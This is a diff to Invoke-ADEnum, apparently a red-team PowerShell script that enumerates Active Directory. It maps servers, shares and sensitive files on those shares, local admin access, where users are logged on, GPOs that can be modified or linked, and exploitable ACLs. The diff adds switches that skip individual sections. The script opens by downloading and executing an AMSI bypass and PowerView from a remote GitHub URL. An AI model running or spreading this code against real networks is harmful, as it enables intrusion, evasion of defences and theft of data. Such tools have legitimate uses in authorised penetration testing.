@@ -1,4 +1,4 @@
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
+﻿iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
 
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/PowerView.ps1')
 
@@ -15,11 +15,38 @@ The Domain to enumerate for (requires you specify a Server)
 .PARAMETER Server
 The DC to bind to (requires you specify a Domain)
 
+.PARAMETER Output
+Specify where to save the output from the tool (default is pwd)
+
+.SWITCH NoServers
+Do not enumerate for Servers
+
+.SWITCH NoWorkstations
+Do not enumerate for Workstations
+
+.SWITCH NoShares
+Do not enumerate for Shares
+
+.SWITCH NoLocalAdminAccess
+Do not enumerate for LocalAdminAccess
+
+.SWITCH NoACLs
+Do not enumerate for ACLs
+
+.SWITCH NoGPOs
+Do not enumerate for GPOs
+
+.SWITCH NoFindDomainUserLocation
+Do not enumerate for FindDomainUserLocation
+
 .EXAMPLE - Run for each domain you can find
 Invoke-ADEnum
 
 .EXAMPLE - Run for a specific Domain/DC
 Invoke-ADEnum -Domain <domain FQDN> -Server <DC FQDN or IP>
+
+.EXAMPLE - Run for each domain the tool can find and save output to C:\Windows\Temp\Invoke-ADEnum.txt
+Invoke-ADEnum -Output C:\Windows\Temp\Invoke-ADEnum.txt
 
 #>
 
@@ -35,7 +62,35 @@ Invoke-ADEnum -Domain <domain FQDN> -Server <DC FQDN or IP>
 		
 		[Parameter (Mandatory=$False, Position = 2, ValueFromPipeline=$true)]
 		[String]
-		$Output
+		$Output,
+		
+		[Parameter (Mandatory=$False, Position = 3, ValueFromPipeline=$true)]
+		[Switch]
+		$NoServers,
+		
+		[Parameter (Mandatory=$False, Position = 4, ValueFromPipeline=$true)]
+		[Switch]
+		$NoWorkstations,
+		
+		[Parameter (Mandatory=$False, Position = 5, ValueFromPipeline=$true)]
+		[Switch]
+		$NoShares,
+		
+		[Parameter (Mandatory=$False, Position = 6, ValueFromPipeline=$true)]
+		[Switch]
+		$NoLocalAdminAccess,
+		
+		[Parameter (Mandatory=$False, Position = 7, ValueFromPipeline=$true)]
+		[Switch]
+		$NoACLs,
+		
+		[Parameter (Mandatory=$False, Position = 8, ValueFromPipeline=$true)]
+		[Switch]
+		$NoGPOs,
+		
+		[Parameter (Mandatory=$False, Position = 9, ValueFromPipeline=$true)]
+		[Switch]
+		$NoFindDomainUserLocation
 
 	)
 	
@@ -178,25 +233,30 @@ Invoke-ADEnum -Domain <domain FQDN> -Server <DC FQDN or IP>
 	else{
 		foreach($AllDomain in $AllDomains){Get-NetDomainController -Domain $AllDomain | Select Name, Forest, Domain, IPAddress | ft -Autosize -Wrap}
 	}
-
-	Write-Host ""
-	Write-Host "Servers:" -ForegroundColor Cyan
-	if($Domain -AND $Server) {
-		Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $Domain -Server $Server -OperatingSystem "*Server*" | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap
-	}
+	
+	if($NoServers){}
 	else{
-		foreach($AllDomain in $AllDomains){Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $AllDomain -OperatingSystem "*Server*" | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap}
+		Write-Host ""
+		Write-Host "Servers:" -ForegroundColor Cyan
+		if($Domain -AND $Server) {
+			Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $Domain -Server $Server -OperatingSystem "*Server*" | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap
+		}
+		else{
+			foreach($AllDomain in $AllDomains){Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $AllDomain -OperatingSystem "*Server*" | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap}
+		}
 	}
-
-	Write-Host ""
-	Write-Host "Workstations:" -ForegroundColor Cyan
-	if($Domain -AND $Server) {
-		Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $Domain -Server $Server | Where-Object { $_.OperatingSystem -notlike "*Server*" } | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap
-	}
+	
+	if($NoWorkstations){}
 	else{
-		foreach($AllDomain in $AllDomains){Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $AllDomain | Where-Object { $_.OperatingSystem -notlike "*Server*" } | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap}
+		Write-Host ""
+		Write-Host "Workstations:" -ForegroundColor Cyan
+		if($Domain -AND $Server) {
+			Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $Domain -Server $Server | Where-Object { $_.OperatingSystem -notlike "*Server*" } | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap
+		}
+		else{
+			foreach($AllDomain in $AllDomains){Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $AllDomain | Where-Object { $_.OperatingSystem -notlike "*Server*" } | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap}
+		}
 	}
-
 	#Write-Host ""
 	#Write-Host "All Groups:" -ForegroundColor Cyan
 	#foreach($AllDomain in $AllDomains){Get-DomainGroup -Domain $AllDomain | select SamAccountName, objectsid, @{Name='Members';Expression={(Get-DomainGroupMember -Recurse -Identity $_.SamAccountname).MemberDistinguishedName -join ' - '}} | ft -Autosize -Wrap}
@@ -417,74 +477,49 @@ Invoke-ADEnum -Domain <domain FQDN> -Server <DC FQDN or IP>
 		foreach($AllDomain in $AllDomains){Get-DomainOU -Identity *server* -Domain $AllDomain | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}} | Format-Table -AutoSize -Wrap}
 	}
 
-
-	Write-Host ""
-	Write-Host "Domain GPOs:" -ForegroundColor Cyan
-	if($Domain -AND $Server) {
-		Get-DomainGPO -Domain $Domain -Server $Server -Properties DisplayName, gpcfilesyspath | sort -Property DisplayName | Format-Table -AutoSize -Wrap
-	}
+	if($NoGPOs){}
 	else{
-		foreach($AllDomain in $AllDomains){Get-DomainGPO -Domain $AllDomain -Properties DisplayName, gpcfilesyspath | sort -Property DisplayName | Format-Table -AutoSize -Wrap}
-	}
-
-	Write-Host ""
-	Write-Host "Who can create GPOs:" -ForegroundColor Cyan
-	if($Domain -AND $Server) {
-		#Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
-		$dcName = "dc=" + $Domain.Split(".")
-		$dcName = $dcName -replace " ", ",dc="
-		Get-DomainObjectAcl -Domain $Domain -Server $Server -Identity "CN=Policies,CN=System,$dcName" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier -Domain $Domain -Server $Server }
-	}
-	else{
-		foreach($AllDomain in $AllDomains){
-			$dcName = "dc=" + $AllDomain.Split(".")
-			$dcName = $dcName -replace " ", ",dc="
-			Get-DomainObjectAcl -Domain $AllDomain -Identity "CN=Policies,CN=System,$dcName" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
+		Write-Host ""
+		Write-Host "Domain GPOs:" -ForegroundColor Cyan
+		if($Domain -AND $Server) {
+			Get-DomainGPO -Domain $Domain -Server $Server -Properties DisplayName, gpcfilesyspath | sort -Property DisplayName | Format-Table -AutoSize -Wrap
 		}
-	}
+		else{
+			foreach($AllDomain in $AllDomains){Get-DomainGPO -Domain $AllDomain -Properties DisplayName, gpcfilesyspath | sort -Property DisplayName | Format-Table -AutoSize -Wrap}
+		}
+		
 
-	Write-Host ""
-	Write-Host "Who can modify existing GPOs:" -ForegroundColor Cyan
-	Write-Host ""
-	
-	if($Domain -AND $Server) {
-		$jSIDdomain = Get-DomainSID -Domain $Domain -Server $Server
-		
-		$jGPOIDRAW = (Get-DomainGPO -Domain $Domain -Server $Server | Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and $_.SecurityIdentifier -match "$jSIDdomain-[\d]{4,10}" })
-		
-		$jGPOIDs = ($jGPOIDRAW | Select-Object -ExpandProperty ObjectDN | Get-Unique)
-		
-		if($jGPOIDRAW){
-			foreach($jGPOID in $jGPOIDs){
-				Write-Host "Name of modifiable Policy: " -ForegroundColor Yellow
-				Get-DomainGPO -Domain $Domain -Server $Server -Identity $jGPOID | select displayName, gpcFileSysPath | Format-Table -HideTableHeaders
-				Write-Host "Who can edit the policy: " -ForegroundColor Yellow
-				echo " "
-				$jGPOIDSELECTs = ($jGPOIDRAW | ? {$_.ObjectDN -eq $jGPOID} | Select-Object -ExpandProperty SecurityIdentifier | Select-Object -ExpandProperty Value | Get-Unique)
-				foreach($jGPOIDSELECT in $jGPOIDSELECTs){$SID = New-Object System.Security.Principal.SecurityIdentifier("$jGPOIDSELECT"); $objUser = $SID.Translate([System.Security.Principal.NTAccount]); $objUser.Value}
-				echo " "
-				echo " "
-				Write-Host "OUs the policy applies to: " -ForegroundColor Yellow
-				Get-DomainOU -Domain $Domain -Server $Server -GPLink "$jGPOID" | select distinguishedName | Format-Table -HideTableHeaders
-				echo "======================="
-				echo "======================="
-				echo " "
+		Write-Host ""
+		Write-Host "Who can create GPOs:" -ForegroundColor Cyan
+		if($Domain -AND $Server) {
+			#Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
+			$dcName = "dc=" + $Domain.Split(".")
+			$dcName = $dcName -replace " ", ",dc="
+			Get-DomainObjectAcl -Domain $Domain -Server $Server -Identity "CN=Policies,CN=System,$dcName" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier -Domain $Domain -Server $Server }
+		}
+		else{
+			foreach($AllDomain in $AllDomains){
+				$dcName = "dc=" + $AllDomain.Split(".")
+				$dcName = $dcName -replace " ", ",dc="
+				Get-DomainObjectAcl -Domain $AllDomain -Identity "CN=Policies,CN=System,$dcName" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
 			}
 		}
-	}
-	else{
-		foreach($AllDomain in $AllDomains){
 
-			$jSIDdomain = Get-DomainSID -Domain $AllDomain
+		Write-Host ""
+		Write-Host "Who can modify existing GPOs:" -ForegroundColor Cyan
+		Write-Host ""
+		
+		if($Domain -AND $Server) {
+			$jSIDdomain = Get-DomainSID -Domain $Domain -Server $Server
 			
-			$jGPOIDRAW = (Get-DomainGPO -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and $_.SecurityIdentifier -match "$jSIDdomain-[\d]{4,10}" })
+			$jGPOIDRAW = (Get-DomainGPO -Domain $Domain -Server $Server | Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and $_.SecurityIdentifier -match "$jSIDdomain-[\d]{4,10}" })
 			
 			$jGPOIDs = ($jGPOIDRAW | Select-Object -ExpandProperty ObjectDN | Get-Unique)
 			
 			if($jGPOIDRAW){
 				foreach($jGPOID in $jGPOIDs){
 					Write-Host "Name of modifiable Policy: " -ForegroundColor Yellow
-					Get-DomainGPO -Domain $AllDomain -Identity $jGPOID | select displayName, gpcFileSysPath | Format-Table -HideTableHeaders
+					Get-DomainGPO -Domain $Domain -Server $Server -Identity $jGPOID | select displayName, gpcFileSysPath | Format-Table -HideTableHeaders
 					Write-Host "Who can edit the policy: " -ForegroundColor Yellow
 					echo " "
 					$jGPOIDSELECTs = ($jGPOIDRAW | ? {$_.ObjectDN -eq $jGPOID} | Select-Object -ExpandProperty SecurityIdentifier | Select-Object -ExpandProperty Value | Get-Unique)
@@ -492,27 +527,55 @@ Invoke-ADEnum -Domain <domain FQDN> -Server <DC FQDN or IP>
 					echo " "
 					echo " "
 					Write-Host "OUs the policy applies to: " -ForegroundColor Yellow
-					Get-DomainOU -Domain $AllDomain -GPLink "$jGPOID" | select distinguishedName | Format-Table -HideTableHeaders
+					Get-DomainOU -Domain $Domain -Server $Server -GPLink "$jGPOID" | select distinguishedName | Format-Table -HideTableHeaders
 					echo "======================="
 					echo "======================="
 					echo " "
 				}
 			}
-
 		}
-	}
+		else{
+			foreach($AllDomain in $AllDomains){
 
-	Write-Host ""
-	Write-Host "Who can link GPOs:" -ForegroundColor Cyan
-	if($Domain -AND $Server) {
-		#foreach($AllDomain in $AllDomains){$gpolinkresult = (Get-DomainOU -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" }); $gpolinkresult | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl; $SIDresolvesto = ConvertFrom-SID $gpolinkresult.SecurityIdentifier ; Write-Host "SecurityIdentifier resolves to " -NoNewline; Write-Host "$SIDresolvesto" -ForegroundColor Yellow}
-		$gpolinkresult = (Get-DomainOU -Domain $Domain -Server $Server | Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" })
-		$gpolinkresult | Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType, @{Name="SecurityIdentifier";Expression={$_.SecurityIdentifier}}, @{Name="SID_Resolves_To";Expression={(ConvertFrom-SID -Domain $Domain -Server $Server $_.SecurityIdentifier)}} | Format-List
-	}
-	else{
-		foreach($AllDomain in $AllDomains){
-			$gpolinkresult = (Get-DomainOU -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" })
-			$gpolinkresult | Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType, @{Name="SecurityIdentifier";Expression={$_.SecurityIdentifier}}, @{Name="SID_Resolves_To";Expression={(ConvertFrom-SID $_.SecurityIdentifier)}} | Format-List
+				$jSIDdomain = Get-DomainSID -Domain $AllDomain
+				
+				$jGPOIDRAW = (Get-DomainGPO -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and $_.SecurityIdentifier -match "$jSIDdomain-[\d]{4,10}" })
+				
+				$jGPOIDs = ($jGPOIDRAW | Select-Object -ExpandProperty ObjectDN | Get-Unique)
+				
+				if($jGPOIDRAW){
+					foreach($jGPOID in $jGPOIDs){
+						Write-Host "Name of modifiable Policy: " -ForegroundColor Yellow
+						Get-DomainGPO -Domain $AllDomain -Identity $jGPOID | select displayName, gpcFileSysPath | Format-Table -HideTableHeaders
+						Write-Host "Who can edit the policy: " -ForegroundColor Yellow
+						echo " "
+						$jGPOIDSELECTs = ($jGPOIDRAW | ? {$_.ObjectDN -eq $jGPOID} | Select-Object -ExpandProperty SecurityIdentifier | Select-Object -ExpandProperty Value | Get-Unique)
+						foreach($jGPOIDSELECT in $jGPOIDSELECTs){$SID = New-Object System.Security.Principal.SecurityIdentifier("$jGPOIDSELECT"); $objUser = $SID.Translate([System.Security.Principal.NTAccount]); $objUser.Value}
+						echo " "
+						echo " "
+						Write-Host "OUs the policy applies to: " -ForegroundColor Yellow
+						Get-DomainOU -Domain $AllDomain -GPLink "$jGPOID" | select distinguishedName | Format-Table -HideTableHeaders
+						echo "======================="
+						echo "======================="
+						echo " "
+					}
+				}
+
+			}
+		}
+
+		Write-Host ""
+		Write-Host "Who can link GPOs:" -ForegroundColor Cyan
+		if($Domain -AND $Server) {
+			#foreach($AllDomain in $AllDomains){$gpolinkresult = (Get-DomainOU -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" }); $gpolinkresult | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl; $SIDresolvesto = ConvertFrom-SID $gpolinkresult.SecurityIdentifier ; Write-Host "SecurityIdentifier resolves to " -NoNewline; Write-Host "$SIDresolvesto" -ForegroundColor Yellow}
+			$gpolinkresult = (Get-DomainOU -Domain $Domain -Server $Server | Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" })
+			$gpolinkresult | Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType, @{Name="SecurityIdentifier";Expression={$_.SecurityIdentifier}}, @{Name="SID_Resolves_To";Expression={(ConvertFrom-SID -Domain $Domain -Server $Server $_.SecurityIdentifier)}} | Format-List
+		}
+		else{
+			foreach($AllDomain in $AllDomains){
+				$gpolinkresult = (Get-DomainOU -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" })
+				$gpolinkresult | Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType, @{Name="SecurityIdentifier";Expression={$_.SecurityIdentifier}}, @{Name="SID_Resolves_To";Expression={(ConvertFrom-SID $_.SecurityIdentifier)}} | Format-List
+			}
 		}
 	}
 
@@ -702,14 +765,17 @@ Invoke-ADEnum -Domain <domain FQDN> -Server <DC FQDN or IP>
 	else{
 		foreach ($AllDomain in $AllDomains) {Get-DomainUser -Domain $AllDomain -AllowDelegation -AdminCount | select-object samaccountname, @{Name="Domain";Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
 	}
-
-	Write-Host ""
-	Write-Host "GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences:" -ForegroundColor Cyan
-	if($Domain -AND $Server) {
-		Get-DomainGPOLocalGroup -Domain $Domain -Server $Server | select GPODisplayName, GroupName | Format-Table -AutoSize -Wrap
-	}
+	
+	if($NoGPOs){}
 	else{
-		foreach($AllDomain in $AllDomains){Get-DomainGPOLocalGroup -Domain $AllDomain | select GPODisplayName, GroupName | Format-Table -AutoSize -Wrap}
+		Write-Host ""
+		Write-Host "GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences:" -ForegroundColor Cyan
+		if($Domain -AND $Server) {
+			Get-DomainGPOLocalGroup -Domain $Domain -Server $Server | select GPODisplayName, GroupName | Format-Table -AutoSize -Wrap
+		}
+		else{
+			foreach($AllDomain in $AllDomains){Get-DomainGPOLocalGroup -Domain $AllDomain | select GPODisplayName, GroupName | Format-Table -AutoSize -Wrap}
+		}
 	}
 
 	Write-Host ""
@@ -720,14 +786,17 @@ Invoke-ADEnum -Domain <domain FQDN> -Server <DC FQDN or IP>
 	else{
 		foreach($AllDomain in $AllDomains){Get-DomainGPOUserLocalGroupMapping -Domain $AllDomain -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | Format-Table -AutoSize -Wrap}
 	}
-
-	Write-Host ""
-	Write-Host "Users which are in a local group of a machine using GPO:" -ForegroundColor Cyan
-	if($Domain -AND $Server) {
-		Get-DomainComputer -Domain $Domain -Server $Server | Find-GPOComputerAdmin -Domain $Domain -Server $Server | Select-Object ComputerName, ObjectName, ObjectSID, IsGroup, GPODisplayName, GPOPath | Format-Table -AutoSize -Wrap
-	}
+	
+	if($NoGPOs){}
 	else{
-		foreach($AllDomain in $AllDomains){Get-DomainComputer -Domain $AllDomain | Find-GPOComputerAdmin | Select-Object ComputerName, ObjectName, ObjectSID, IsGroup, GPODisplayName, GPOPath | Format-Table -AutoSize -Wrap}
+		Write-Host ""
+		Write-Host "Users which are in a local group of a machine using GPO:" -ForegroundColor Cyan
+		if($Domain -AND $Server) {
+			Get-DomainComputer -Domain $Domain -Server $Server | Find-GPOComputerAdmin -Domain $Domain -Server $Server | Select-Object ComputerName, ObjectName, ObjectSID, IsGroup, GPODisplayName, GPOPath | Format-Table -AutoSize -Wrap
+		}
+		else{
+			foreach($AllDomain in $AllDomains){Get-DomainComputer -Domain $AllDomain | Find-GPOComputerAdmin | Select-Object ComputerName, ObjectName, ObjectSID, IsGroup, GPODisplayName, GPOPath | Format-Table -AutoSize -Wrap}
+		}
 	}
 
 	Write-Host ""
@@ -738,24 +807,29 @@ Invoke-ADEnum -Domain <domain FQDN> -Server <DC FQDN or IP>
 	else{
 		foreach($AllDomain in $AllDomains){Get-DomainUser -Domain $AllDomain | Find-GPOLocation | Select-Object ObjectName, ObjectSID, Domain, IsGroup, GPODisplayName, GPOPath | Format-Table -AutoSize -Wrap}
 	}
-
-	Write-Host ""
-	Write-Host "Find Local Admin Access:" -ForegroundColor Cyan
-	if($Domain -AND $Server) {
-		Find-LocalAdminAccess -Server $Server -CheckShareAccess -Threads 100 -Delay 1 | Out-String
-	}
+	
+	if($NoLocalAdminAccess){}
 	else{
-		foreach($AllDomain in $AllDomains){Find-LocalAdminAccess -Domain $AllDomain -CheckShareAccess -Threads 100 -Delay 1 | Out-String}
+		Write-Host ""
+		Write-Host "Find Local Admin Access:" -ForegroundColor Cyan
+		if($Domain -AND $Server) {
+			Find-LocalAdminAccess -Server $Server -CheckShareAccess -Threads 100 -Delay 1 | Out-String
+		}
+		else{
+			foreach($AllDomain in $AllDomains){Find-LocalAdminAccess -Domain $AllDomain -CheckShareAccess -Threads 100 -Delay 1 | Out-String}
+		}
 	}
 	
-
-	Write-Host ""
-	Write-Host "Find Domain User Location:" -ForegroundColor Cyan
-	if($Domain -AND $Server) {
-		Find-DomainUserLocation -Domain $Domain -Server $Server -Delay 1 | select UserName, SessionFromName | Out-String
-	}
+	if($NoFindDomainUserLocation){}
 	else{
-		foreach($AllDomain in $AllDomains){Find-DomainUserLocation -Domain $AllDomain -Delay 1 | select UserName, SessionFromName | Out-String}
+		Write-Host ""
+		Write-Host "Find Domain User Location:" -ForegroundColor Cyan
+		if($Domain -AND $Server) {
+			Find-DomainUserLocation -Domain $Domain -Server $Server -Delay 1 | select UserName, SessionFromName | Out-String
+		}
+		else{
+			foreach($AllDomain in $AllDomains){Find-DomainUserLocation -Domain $AllDomain -Delay 1 | select UserName, SessionFromName | Out-String}
+		}
 	}
 
 <# 	Write-Host ""
@@ -775,43 +849,49 @@ Invoke-ADEnum -Domain <domain FQDN> -Server <DC FQDN or IP>
 	else{
 		foreach($AllDomain in $AllDomains){Get-DomainGroup -Domain $AllDomain -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} | Out-String}
 	}
+	
+	if($NoShares){}
+	else{
+		Write-Host ""
+		Write-Host "Find Domain Shares:" -ForegroundColor Cyan
+		if($Domain -AND $Server) {
+			Find-DomainShare -ComputerDomain $Domain -Server $Server -CheckShareAccess -Threads 100 -Delay 1 | Select Name,Remark,ComputerName | Out-String
+		}
+		
+		else{
+			foreach($AllDomain in $AllDomains){Find-DomainShare -ComputerDomain $AllDomain -CheckShareAccess -Threads 100 -Delay 1 | Select Name,Remark,ComputerName | Out-String}
+		}
 
-	Write-Host ""
-	Write-Host "Find Domain Shares:" -ForegroundColor Cyan
-	if($Domain -AND $Server) {
-		Find-DomainShare -ComputerDomain $Domain -Server $Server -CheckShareAccess -Threads 100 -Delay 1 | Select Name,Remark,ComputerName | Out-String
+		Write-Host ""
+		Write-Host "Find Interesting Domain Share Files:" -ForegroundColor Cyan
+		if($Domain -AND $Server) {
+			Find-InterestingDomainShareFile -Server $Server -Threads 100 -Delay 1 | Out-String
+		}
+		else{
+			foreach($AllDomain in $AllDomains){Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Threads 100 -Delay 1 | Out-String}
+		}
+		
+		Write-Host ""
+		Write-Host "Second run (more file extensions):"
+		if($Domain -AND $Server) {
+			Find-InterestingDomainShareFile -Server $Server -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1 | Out-String
+		}
+		else{
+			foreach($AllDomain in $AllDomains){Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1 | Out-String}
+		}
 	}
 	
+	if($NoACLs){}
 	else{
-		foreach($AllDomain in $AllDomains){Find-DomainShare -ComputerDomain $AllDomain -CheckShareAccess -Threads 100 -Delay 1 | Select Name,Remark,ComputerName | Out-String}
-	}
-
-	Write-Host ""
-	Write-Host "Find Interesting Domain Share Files:" -ForegroundColor Cyan
-	if($Domain -AND $Server) {
-		Find-InterestingDomainShareFile -Server $Server -Threads 100 -Delay 1 | Out-String
-	}
-	else{
-		foreach($AllDomain in $AllDomains){Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Threads 100 -Delay 1 | Out-String}
-	}
-	
-	Write-Host ""
-	Write-Host "Second run (more file extensions):"
-	if($Domain -AND $Server) {
-		Find-InterestingDomainShareFile -Server $Server -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1 | Out-String
-	}
-	else{
-		foreach($AllDomain in $AllDomains){Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1 | Out-String}
-	}
-
-	Write-Host ""
-	Write-Host "Find interesting ACLs:" -ForegroundColor Cyan
-	#Invoke-ACLScanner -Domain $Domain -Server $Server -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | Out-String
-	if($Domain -AND $Server) {
-		Invoke-ACLScanner -Domain $Domain -Server $Server -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights | ft -AutoSize -Wrap
-	}
-	else{
-		foreach($AllDomain in $AllDomains){Invoke-ACLScanner -Domain $AllDomain -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights | ft -AutoSize -Wrap}
+		Write-Host ""
+		Write-Host "Find interesting ACLs:" -ForegroundColor Cyan
+		#Invoke-ACLScanner -Domain $Domain -Server $Server -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | Out-String
+		if($Domain -AND $Server) {
+			Invoke-ACLScanner -Domain $Domain -Server $Server -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights | ft -AutoSize -Wrap
+		}
+		else{
+			foreach($AllDomain in $AllDomains){Invoke-ACLScanner -Domain $AllDomain -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights | ft -AutoSize -Wrap}
+		}
 	}
 	
 	# Stop capturing the output and display it on the console
